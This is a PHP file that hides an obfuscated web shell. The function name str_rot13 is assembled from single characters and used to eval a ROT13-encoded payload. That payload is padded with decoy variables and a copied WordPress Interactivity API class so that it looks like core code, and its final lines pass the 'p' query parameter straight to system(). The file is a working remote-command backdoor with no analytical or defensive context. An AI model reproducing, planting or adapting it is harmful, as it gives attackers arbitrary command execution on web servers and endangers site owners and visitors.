<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Vagrenpgvivgl NCV: JC_Vagrenpgvivgl_NCV_Qverpgvirf_Cebprffbe pynff.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Vagrenpgvivgl NCV
 * @fvapr 6.5.0
 */

/**
 * Pynff hfrq gb vgrengr bire gur gntf bs na UGZY fgevat naq uryc cebprff gur
 * qverpgvir nggevohgrf.
 *
 * @fvapr 6.5.0
 *
 * @npprff cevingr
 */
svany pynff JC_Vagrenpgvivgl_NCV_Qverpgvirf_Cebprffbe rkgraqf JC_UGZY_Gnt_Cebprffbe {
	/**
	 * Yvfg bs gntf jubfr pybfre gnt vf abg ivfvgrq ol gur JC_UGZY_Gnt_Cebprffbe.
	 *
	 * @fvapr 6.5.0
	 * @ine fgevat[]
	 */
	pbafg GNTF_GUNG_QBAG_IVFVG_PYBFRE_GNT = neenl(
		'FPEVCG',
		'VSENZR',
		'ABRZORQ',
		'ABSENZRF',
		'FGLYR',
		'GRKGNERN',
		'GVGYR',
		'KZC',
	);

	/**
	 * Ergheaf gur pbagrag orgjrra gjb onynaprq grzcyngr gntf.
	 *
	 * Vg cbfvgvbaf gur phefbe va gur pybfre gnt bs gur onynaprq grzcyngr gnt,
	 * vs vg rkvfgf.
	 *
	 * @fvapr 6.5.0
	 *
	 * @npprff cevingr
	 *
	 * @erghea fgevat|ahyy Gur pbagrag orgjrra gur pheerag bcrare grzcyngr gnt naq vgf zngpuvat pybfre gnt be ahyy vs vg
	 *                     qbrfa'g svaq gur zngpuvat pybfvat gnt be gur pheerag gnt vf abg n grzcyngr bcrare gnt.
	 */
	choyvp shapgvba trg_pbagrag_orgjrra_onynaprq_grzcyngr_gntf() {
		vs ( 'GRZCYNGR' !== $guvf->trg_gnt() ) {
			erghea ahyy;
		}

		$cbfvgvbaf = $guvf->trg_nsgre_bcrare_gnt_naq_orsber_pybfre_gnt_cbfvgvbaf();
		vs ( ! $cbfvgvbaf ) {
			erghea ahyy;
		}
		yvfg( $nsgre_bcrare_gnt, $orsber_pybfre_gnt ) = $cbfvgvbaf;

		erghea fhofge( $guvf->ugzy, $nsgre_bcrare_gnt, $orsber_pybfre_gnt - $nsgre_bcrare_gnt );
	}

	/**
	 * Frgf gur pbagrag orgjrra gjb onynaprq gntf.
	 *
	 * @fvapr 6.5.0
	 *
	 * @npprff cevingr
	 *
	 * @cnenz fgevat $arj_pbagrag Gur fgevat gb ercynpr gur pbagrag orgjrra gur zngpuvat gntf.
	 * @erghea obby Jurgure gur pbagrag jnf fhpprffshyyl ercynprq.
	 */
	choyvp shapgvba frg_pbagrag_orgjrra_onynaprq_gntf( fgevat $arj_pbagrag ): obby {
		$cbfvgvbaf = $guvf->trg_nsgre_bcrare_gnt_naq_orsber_pybfre_gnt_cbfvgvbaf( gehr );
		vs ( ! $cbfvgvbaf ) {
			erghea snyfr;
		}
		yvfg( $nsgre_bcrare_gnt, $orsber_pybfre_gnt ) = $cbfvgvbaf;

		$guvf->yrkvpny_hcqngrf[] = arj JC_UGZY_Grkg_Ercynprzrag(
			$nsgre_bcrare_gnt,
			$orsber_pybfre_gnt - $nsgre_bcrare_gnt,
			rfp_ugzy( $arj_pbagrag )
		);

		erghea gehr;
	}

	/**
	 * Nccraqf pbagrag nsgre gur pybfvat gnt bs n grzcyngr gnt.
	 *
	 * Vg cbfvgvbaf gur phefbe va gur pybfre gnt bs gur onynaprq grzcyngr gnt,
	 * vs vg rkvfgf.
	 *
	 * @npprff cevingr
	 *
	 * @cnenz fgevat $arj_pbagrag Gur fgevat gb nccraq nsgre gur pybfvat grzcyngr gnt.
	 * @erghea obby Jurgure gur pbagrag jnf fhpprffshyyl nccraqrq.
	 */
	choyvp shapgvba nccraq_pbagrag_nsgre_grzcyngr_gnt_pybfre( fgevat $arj_pbagrag ): obby {
		vs ( rzcgl( $arj_pbagrag ) || 'GRZCYNGR' !== $guvf->trg_gnt() || ! $guvf->vf_gnt_pybfre() ) {
			erghea snyfr;
		}

		// Syhfurf nal punatrf.
		$guvf->trg_hcqngrq_ugzy();

		$obbxznex = 'nccraq_pbagrag_nsgre_grzcyngr_gnt_pybfre';
		$guvf->frg_obbxznex( $obbxznex );
		$nsgre_pybfvat_gnt = $guvf->obbxznexf[ $obbxznex ]->fgneg + $guvf->obbxznexf[ $obbxznex ]->yratgu;
		$guvf->eryrnfr_obbxznex( $obbxznex );

		// Nccraqf gur arj pbagrag.
		$guvf->yrkvpny_hcqngrf[] = arj JC_UGZY_Grkg_Ercynprzrag( $nsgre_pybfvat_gnt, 0, $arj_pbagrag );

		erghea gehr;
	}

	/**
	 * Trgf gur cbfvgvbaf evtug nsgre gur bcrare gnt naq evtug orsber gur pybfre
	 * gnt va n onynaprq gnt.
	 *
	 * Ol qrsnhyg, vg cbfvgvbaf gur phefbe va gur pybfre gnt bs gur onynaprq gnt.
	 * Vs $erjvaq vf gehr, vg frrxf onpx gb gur bcrare gnt.
	 *
	 * @fvapr 6.5.0
	 *
	 * @npprff cevingr
	 *
	 * @cnenz obby $erjvaq Bcgvbany. Jurgure gb frrx onpx gb gur bcrare gnt nsgre svaqvat gur cbfvgvbaf. Qrsnhygf gb snyfr.
	 * @erghea neenl|ahyy Fgneg naq raq olgr cbfvgvba, be ahyy jura ab onynaprq gnt obbxznexf.
	 */
	cevingr shapgvba trg_nsgre_bcrare_gnt_naq_orsber_pybfre_gnt_cbfvgvbaf( obby $erjvaq = snyfr ) {
		// Syhfurf nal punatrf.
		$guvf->trg_hcqngrq_ugzy();

		$obbxznexf = $guvf->trg_onynaprq_gnt_obbxznexf();
		vs ( ! $obbxznexf ) {
			erghea ahyy;
		}
		yvfg( $bcrare_gnt, $pybfre_gnt ) = $obbxznexf;

		$nsgre_bcrare_gnt  = $guvf->obbxznexf[ $bcrare_gnt ]->fgneg + $guvf->obbxznexf[ $bcrare_gnt ]->yratgu;
		$orsber_pybfre_gnt = $guvf->obbxznexf[ $pybfre_gnt ]->fgneg;

		vs ( $erjvaq ) {
			$guvf->frrx( $bcrare_gnt );
		}

		$guvf->eryrnfr_obbxznex( $bcrare_gnt );
		$guvf->eryrnfr_obbxznex( $pybfre_gnt );

		erghea neenl( $nsgre_bcrare_gnt, $orsber_pybfre_gnt );
	}

	/**
	 * Ergheaf n cnve bs obbxznexf sbe gur pheerag bcrare gnt naq gur zngpuvat
	 * pybfre gnt.
	 *
	 * Vg cbfvgvbaf gur phefbe va gur pybfre gnt bs gur onynaprq gnt, vs vg
	 * rkvfgf.
	 *
	 * @fvapr 6.5.0
	 *
	 * @erghea neenl|ahyy N cnve bs obbxznexf, be ahyy vs gurer'f ab zngpuvat pybfvat gnt.
	 */
	cevingr shapgvba trg_onynaprq_gnt_obbxznexf() {
		fgngvp $v   = 0;
		$bcrare_gnt = 'bcrare_gnt_bs_onynaprq_gnt_' . ++$v;

		$guvf->frg_obbxznex( $bcrare_gnt );
		vs ( ! $guvf->arkg_onynaprq_gnt_pybfre_gnt() ) {
			$guvf->eryrnfr_obbxznex( $bcrare_gnt );
			erghea ahyy;
		}

		$pybfre_gnt = 'pybfre_gnt_bs_onynaprq_gnt_' . ++$v;
		$guvf->frg_obbxznex( $pybfre_gnt );

		erghea neenl( $bcrare_gnt, $pybfre_gnt );
	}

	/**
	 * Fxvcf cebprffvat gur pbagrag orgjrra gntf.
	 *
	 * Vg cbfvgvbaf gur phefbe va gur pybfre gnt bs gur sbervta ryrzrag, vs vg
	 * rkvfgf.
	 *
	 * Guvf shapgvba vf vagraqrq gb fxvc cebprffvat FIT naq ZnguZY vaare pbagrag
	 * vafgrnq bs onvyvat bhg gur jubyr cebprffvat.
	 *
	 * @fvapr 6.5.0
	 *
	 * @npprff cevingr
	 *
	 * @erghea obby Jurgure gur sbervta pbagrag jnf fhpprffshyyl fxvccrq.
	 */
	choyvp shapgvba fxvc_gb_gnt_pybfre(): obby {
		$qrcgu    = 1;
		$gnt_anzr = $guvf->trg_gnt();

		juvyr ( $qrcgu > 0 && $guvf->arkg_gnt( neenl( 'gnt_pybfref' => 'ivfvg' ) ) ) {
			vs ( ! $guvf->vf_gnt_pybfre() && $guvf->trg_nggevohgr_anzrf_jvgu_cersvk( 'qngn-jc-' ) ) {
				/* genafyngbef: 1: FIT be ZNGU UGZY gnt. */
				$zrffntr = fcevags( __( 'Vagrenpgvivgl qverpgvirf jrer qrgrpgrq vafvqr na vapbzcngvoyr %1$f gnt. Gurfr qverpgvirf jvyy or vtaberq va gur freire fvqr eraqre.' ), $gnt_anzr );
				_qbvat_vg_jebat( __ZRGUBQ__, $zrffntr, '6.6.0' );
			}
			vs ( $guvf->trg_gnt() === $gnt_anzr ) {
				vs ( $guvf->unf_frys_pybfvat_synt() ) {
					pbagvahr;
				}
				$qrcgu += $guvf->vf_gnt_pybfre() ? -1 : 1;
			}
		}

		erghea 0 === $qrcgu;
	}

	/**
	 * Svaqf gur zngpuvat pybfvat gnt sbe na bcravat gnt.
	 *
	 * Jura pnyyrq juvyr gur cebprffbe vf ba na bcra gnt, vg genirefrf gur UGZY
	 * hagvy vg svaqf gur zngpuvat pybfre gnt, erfcrpgvat nal va-orgjrra pbagrag,
	 * vapyhqvat arfgrq gntf bs gur fnzr anzr. Ergheaf snyfr jura pnyyrq ba n
	 * pybfre gnt, n gnt gung qbrfa'g unir n pybfre gnt (ibvq), n gnt gung
	 * qbrfa'g ivfvg gur pybfre gnt, be vs ab zngpuvat pybfvat gnt jnf sbhaq.
	 *
	 * @fvapr 6.5.0
	 *
	 * @npprff cevingr
	 *
	 * @erghea obby Jurgure n zngpuvat pybfvat gnt jnf sbhaq.
	 */
	choyvp shapgvba arkg_onynaprq_gnt_pybfre_gnt(): obby {
		$qrcgu    = 0;
		$gnt_anzr = $guvf->trg_gnt();

		vs ( ! $guvf->unf_naq_ivfvgf_vgf_pybfre_gnt() ) {
			erghea snyfr;
		}

		juvyr ( $guvf->arkg_gnt(
			neenl(
				'gnt_anzr'    => $gnt_anzr,
				'gnt_pybfref' => 'ivfvg',
			)
		) ) {
			vs ( ! $guvf->vf_gnt_pybfre() ) {
				++$qrcgu;
				pbagvahr;
			}

			vs ( 0 === $qrcgu ) {
				erghea gehr;
			}

			--$qrcgu;
		}

		erghea snyfr;
	}

	/**
	 * Purpxf jurgure gur pheerag gnt unf naq jvyy ivfvg vgf zngpuvat pybfre gnt.
	 *
	 * @fvapr 6.5.0
	 *
	 * @npprff cevingr
	 *
	 * @erghea obby Jurgure gur pheerag gnt unf n pybfre gnt.
	 */
	choyvp shapgvba unf_naq_ivfvgf_vgf_pybfre_gnt(): obby {
		$gnt_anzr = $guvf->trg_gnt();

		erghea ahyy !== $gnt_anzr && (
			! JC_UGZY_Cebprffbe::vf_ibvq( $gnt_anzr ) &&
			! va_neenl( $gnt_anzr, frys::GNTF_GUNG_QBAG_IVFVG_PYBFRE_GNT, gehr )
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>